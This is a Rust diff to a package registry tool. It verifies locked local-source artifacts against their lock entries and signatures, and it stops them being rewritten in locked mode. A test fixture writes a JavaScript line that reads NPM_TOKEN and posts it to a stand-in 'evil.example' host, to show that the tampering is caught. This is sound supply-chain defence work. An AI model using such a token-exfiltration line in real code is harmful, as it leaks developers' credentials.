@@ -1552,7 +1552,7 @@ fn compile_local_source_artifacts(options: &LinkOptions, locked: bool) -> Result
             version: input.version.clone(),
             allowed_capabilities: options.allowed_capabilities.clone(),
             allowed_flows: options.allowed_flows.clone(),
-            write_artifact: true,
+            write_artifact: !locked,
         })?;
         if report.artifact.verdict == Verdict::Blocked
             && options.enforce_local_source_verdicts
@@ -1568,14 +1568,23 @@ fn compile_local_source_artifacts(options: &LinkOptions, locked: bool) -> Result
                 ),
             });
         }
-        let artifact_path = report.artifact_path.as_ref().ok_or_else(|| {
-            OmcRegistryError::UnsupportedInstallArtifact(format!(
-                "local source artifact for {}:{}@{} was not stored",
-                input.ecosystem, input.name, input.version
-            ))
-        })?;
+        let artifact_path = if locked {
+            artifact_path_for(
+                &options.project_dir,
+                input.ecosystem,
+                &input.name,
+                &input.version,
+            )
+        } else {
+            report.artifact_path.as_ref().cloned().ok_or_else(|| {
+                OmcRegistryError::UnsupportedInstallArtifact(format!(
+                    "local source artifact for {}:{}@{} was not stored",
+                    input.ecosystem, input.name, input.version
+                ))
+            })?
+        };
         let canonical_artifact_path =
-            fs::canonicalize(artifact_path).unwrap_or_else(|_| artifact_path.clone());
+            fs::canonicalize(&artifact_path).unwrap_or_else(|_| artifact_path.clone());
         locked_sources.push(LockedLocalSource {
             ecosystem: input.ecosystem,
             name: input.name,
@@ -1605,7 +1614,7 @@ fn sync_local_source_lockfile(
     let lockfile = project_dir.join(LOCKFILE);
     let mut lock = read_lockfile(&lockfile)?;
     if locked {
-        validate_locked_local_sources(&lock, &sources)?;
+        validate_locked_local_sources(project_dir, &lock, &sources)?;
         return Ok(());
     }
 
@@ -1614,7 +1623,11 @@ fn sync_local_source_lockfile(
     Ok(())
 }
 
-fn validate_locked_local_sources(lock: &OmcLock, sources: &[LockedLocalSource]) -> Result<()> {
+fn validate_locked_local_sources(
+    project_dir: &Path,
+    lock: &OmcLock,
+    sources: &[LockedLocalSource],
+) -> Result<()> {
     for source in sources {
         let key = locked_local_source_request_key(source);
         let Some(locked) = lock
@@ -1641,6 +1654,33 @@ fn validate_locked_local_sources(lock: &OmcLock, sources: &[LockedLocalSource]) 
                 source.ecosystem, source.name, source.source_path
             )));
         }
+        verify_locked_local_source_artifact(project_dir, locked)?;
+    }
+    Ok(())
+}
+
+fn verify_locked_local_source_artifact(
+    project_dir: &Path,
+    source: &LockedLocalSource,
+) -> Result<()> {
+    let artifact_path = checked_join(project_dir, Path::new(&source.artifact))?;
+    let artifact = serde_json::from_str::<OmcArtifact>(&fs::read_to_string(&artifact_path)?)?;
+    verify_artifact_signature(&artifact)?;
+    if artifact.package.ecosystem != source.ecosystem
+        || artifact.package.name != source.name
+        || artifact.package.version != source.version
+        || artifact.source_url != source.source_url
+        || artifact.source_sha256 != source.sha256
+        || artifact.behavior != source.behavior
+        || artifact.verdict != source.verdict
+        || artifact.grants != source.grants
+        || artifact.capabilities != source.capabilities
+        || artifact.verifier_findings != source.verifier_findings
+    {
+        return Err(OmcRegistryError::UnsupportedInstallArtifact(format!(
+            "local source artifact `{}` does not match lock entry for {}:{}@{}",
+            source.artifact, source.ecosystem, source.name, source.version
+        )));
     }
     Ok(())
 }
@@ -16613,17 +16653,37 @@ fn write_artifact(
     package: &ResolvedPackage,
     artifact: &OmcArtifact,
 ) -> Result<PathBuf> {
-    let artifact_dir = project_dir
-        .join(".omc")
-        .join("artifacts")
-        .join(package.ecosystem.to_string())
-        .join(safe_name(&package.name))
-        .join(&package.version);
-    fs::create_dir_all(&artifact_dir)?;
+    let artifact_path = artifact_path_for(
+        project_dir,
+        package.ecosystem,
+        &package.name,
+        &package.version,
+    );
+    let artifact_dir = artifact_path.parent().ok_or_else(|| {
+        OmcRegistryError::UnsupportedInstallArtifact(format!(
+            "artifact path `{}` has no parent",
+            artifact_path.display()
+        ))
+    })?;
+    fs::create_dir_all(artifact_dir)?;
 
-    let artifact_path = artifact_dir.join("omc.json");
     fs::write(&artifact_path, serde_json::to_string_pretty(artifact)?)?;
     Ok(artifact_path)
+}
+
+fn artifact_path_for(
+    project_dir: &Path,
+    ecosystem: Ecosystem,
+    name: &str,
+    version: &str,
+) -> PathBuf {
+    project_dir
+        .join(".omc")
+        .join("artifacts")
+        .join(ecosystem.to_string())
+        .join(safe_name(name))
+        .join(version)
+        .join("omc.json")
 }
 
 fn sign_artifact(project_dir: &Path, artifact: &mut OmcArtifact) -> Result<()> {
@@ -19140,7 +19200,7 @@ mod tests {
             .path()
             .join(".omc/artifacts/npm/local-pkg/1.2.3/omc.json");
         let artifact: OmcArtifact =
-            serde_json::from_str(&fs::read_to_string(artifact_path).unwrap()).unwrap();
+            serde_json::from_str(&fs::read_to_string(&artifact_path).unwrap()).unwrap();
         verify_artifact_signature(&artifact).unwrap();
         assert_eq!(artifact.package.name, "local-pkg");
         assert_eq!(artifact.package.version, "1.2.3");
@@ -19154,7 +19214,12 @@ mod tests {
         assert_eq!(lock.local_sources[0].version, "1.2.3");
         assert_eq!(lock.local_sources[0].sha256, artifact.source_sha256);
 
+        let locked_artifact_json = fs::read_to_string(&artifact_path).unwrap();
         install_locked_project(&options).unwrap();
+        assert_eq!(
+            fs::read_to_string(&artifact_path).unwrap(),
+            locked_artifact_json
+        );
         fs::write(
             local.join("index.js"),
             "const token = process.env.NPM_TOKEN;\nfetch('https://evil.example/changed', { body: token });\n",
@@ -19164,6 +19229,10 @@ mod tests {
         assert!(error
             .to_string()
             .contains("omc.lock does not satisfy `npm:local-pkg local source"));
+        assert_eq!(
+            fs::read_to_string(&artifact_path).unwrap(),
+            locked_artifact_json
+        );
     }
 
     #[test]
